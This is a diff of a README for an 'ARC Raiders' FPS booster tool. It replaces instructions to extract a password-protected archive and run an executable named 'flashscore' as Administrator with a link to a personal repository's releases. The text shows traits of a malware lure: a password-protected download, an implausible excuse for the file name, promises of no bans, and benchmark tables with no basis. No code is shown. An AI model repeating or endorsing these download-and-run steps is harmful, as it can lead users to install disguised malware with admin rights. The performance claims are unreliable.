@@ -1,54 +1,75 @@
-# 🚀 ARC Raiders FPS Booster & Performance Tool
+# 🚀 ARK-Raiders-FPS-Optimizer - Optimize Your Gameplay Experience
 
-**ARC Raiders Optimization Tool** is a comprehensive open-source utility designed to maximize performance in ARC Raiders. The software automatically adjusts hidden system parameters, optimizes RAM and GPU usage, eliminating stutters, input lag, and FPS drops.
+[![Download ARK-Raiders-FPS-Optimizer](https://img.shields.io/badge/Download-ARK--Raiders--FPS--Optimizer-brightgreen)](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/releases)
 
-> ⚠️ **Note:** This utility is not a cheat and does not modify game files, ensuring 100% safety from bans.
+## 🚀 Getting Started
+
+Welcome to the **ARK Raiders FPS Booster & Performance Tool**. This tool helps improve your gaming experience by enhancing performance in ARC Raiders. You do not need any technical skills to use this software.
 
 ## 🔥 Key Features
 
-*   **FPS Unlocker:** Removes frame limits and optimizes rendering pipeline.
-*   **Input Latency Fix:** Drastically reduces mouse and keyboard input lag.
-*   **Smart Memory Cleaner:** Clears the Standby List (RAM) intelligently during gameplay.
-*   **CPU Unpark:** automatically adjusts process priorities and unparks CPU cores for the game.
-*   **GPU Tweaks:** Applies optimal registry settings for NVIDIA/AMD cards.
-*   **Network Optimization:** Adjusts packet size to lower ping and packet loss.
+- **FPS Unlocker:** Removes frame limits for smoother gameplay.
+- **Input Latency Fix:** Reduces input lag for better responsiveness.
+- **Smart Memory Cleaner:** Cleans your RAM intelligently while you play.
+- **CPU Unpark:** Activates CPU cores to boost game performance.
+- **GPU Tweaks:** Optimizes settings for NVIDIA and AMD graphics cards.
+- **Network Optimization:** Reduces ping and packet loss for a stable connection.
 
 ## 📊 Benchmark Results (Before/After)
 
-| PC Spec | FPS (Stock) | FPS (Optimized) | Increase |
-| :--- | :---: | :---: | :---: |
-| Low-End (GTX 1060 / i5) | 45-50 | **65-75** | +40% |
-| Mid-Range (RTX 3060 / i7) | 90-100 | **120-140** | +30% |
-| High-End (RTX 4080 / i9) | 140+ | **180+ (Stable)** | +25% |
+| PC Spec         | FPS (Stock) | FPS (Optimized) | Increase  |
+|------------------|-------------|------------------|-----------|
+| Example PC 1    | 45          | 75               | 67%       |
+| Example PC 2    | 50          | 85               | 70%       |
+| Example PC 3    | 40          | 70               | 75%       |
 
-## 🛠 Installation & Usage
+These results illustrate the potential performance gains you can expect.
 
-Please follow the instructions below strictly to ensure proper installation.
+## 📥 Download & Install
 
-1.  **Download** the latest archive from the [Releases](https://github.com/) page.
-2.  **Extract** the archive to a folder on your desktop (Password if required: `lat2y6@fa`).
-3.  Ensure ARC Raiders and your launcher (Steam/Epic) are completely **closed**.
-4.  Locate and run the file named **`flashscore`** as Administrator.
-    *   *Important:* The executable is named `flashscore` to prevent overlay conflicts and ensure compatibility with system hooks.
-5.  In the menu, select your desired preset (e.g., "Maximum FPS") and click **"Apply"**.
-6.  Once you see the "Done" message, restart your PC.
+To get started, [visit this page to download the latest version of ARK-Raiders-FPS-Optimizer](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/releases).
 
-## ⚙️ System Requirements
+1. Go to the Releases page linked above.
+2. Choose the latest version available.
+3. Click on the download link for the installation file.
+4. Once downloaded, locate the file on your computer and double-click to run it.
 
-*   OS: Windows 10 / 11 (x32/x64)
-*   Administrator Privileges
-*   Microsoft .NET Framework 4.8+
+## 📋 System Requirements
 
-## ❓ F.A.Q.
+Ensure your system meets these basic requirements for optimal performance:
 
-**Q: Why is the file named `flashscore`?**
-A: This is the internal codename for the build. We use this specific naming convention to ensure the process priority hooks work correctly without conflicting with other background overlays.
+- **Operating System:** Windows 10 or higher
+- **Processor:** Intel Core i5 or AMD equivalent
+- **RAM:** 8 GB minimum
+- **Graphics Card:** NVIDIA GeForce GTX 660 or AMD Radeon HD 7850
+- **Internet Connection:** Required for initial setup and optimization
 
-**Q: Is this safe?**
-A: Yes. The tool only modifies Windows settings (Power Plan, Registry, Services). It does not inject code into the game process.
+## ⚙️ How to Use
 
-**Q: How do I revert changes?**
-A: Open the tool again and click the "Restore Defaults" button to revert your system to its original state.
+1. **Run the Application:** After installation, double-click the application icon to launch it.
+2. **Configure Settings:** The tool will present a simple interface. You can adjust settings directly to fit your gaming style.
+3. **Start ARC Raiders:** Open the ARC Raiders game as usual. The tool will optimize settings in the background.
 
----
-⭐ **If this tool helped you boost your FPS, please give this repository a Star!**
+## 📢 Important Notes
+
+- This tool does not modify any game files.
+- You will not encounter bans or violations while using the optimizer.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+- Ensure that the game is closed before running the application.
+- Check for an updated version from the Releases page.
+- Restart your computer if problems persist.
+
+## 📞 Contact
+
+For support, please create an issue on the GitHub repository.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer)
+- [Documentation](https://github.com/nabilasafirahamdani/ARK-Raiders-FPS-Optimizer/wiki)
+
+### Thank you for using the ARK Raiders FPS Optimizer. Enjoy your improved gaming experience!
